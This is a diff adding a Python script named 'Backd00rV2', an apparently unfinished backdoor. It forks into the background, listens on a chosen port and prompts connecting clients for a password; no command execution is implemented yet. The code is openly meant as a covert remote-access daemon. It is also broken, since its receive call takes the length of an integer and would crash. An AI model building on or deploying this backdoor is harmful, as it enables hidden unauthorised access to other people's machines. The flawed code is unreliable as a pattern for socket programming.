@@ -1,0 +1,80 @@
+#!/usr/bin/python3
+
+import sys
+import os
+import socket
+
+
+# ======= Variables =======
+PORT = 1337 # Default port
+PW = ""
+HOST = ""
+
+# ======= Functions =======
+def usage():
+  """
+  usage
+  """
+  print("usage:\n" +
+        "./Backd00rV2 [PASSWORD] [PORT]\n")
+  exit(0)
+
+def error(c):
+  """
+  Errors
+  """
+  print("Error: " + c)
+  exit(-1)
+
+def action(conn):
+  """
+  Authentication
+  """
+  pw_in = 0
+  passwd = bytes("\nPassword?\n",'utf-8')
+  conn.send(passwd)
+  pw_in = conn.recv(len(pw_in))
+  print(str(pw_in))
+
+
+
+
+
+# ======= Main =======
+
+argv = sys.argv
+
+# Error handling
+if (len(argv) != 3):
+  error("Not enough arguments")
+
+for n in argv[2]:
+  if (not n.isdigit()):
+    error("Not Valid Port")
+
+PORT = int(argv[2])
+if (PORT > 65535):
+  error("Not Valid Port")
+
+PW = argv[1]
+print("Password: " + str(PW) + "\n" + 
+      "Port: " + str(PORT) + "\n")
+
+# Create child process and kill parent
+if (os.fork() != 0):
+    sys.exit(0)
+
+# Create socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(5)
+
+sock.bind(("localhost",PORT))
+sock.listen(0)
+
+while True:
+  try:
+    (conn,address) = sock.accept()
+  except:
+    print("Error: Cannot accept")
+  else:
+    run = action(conn)
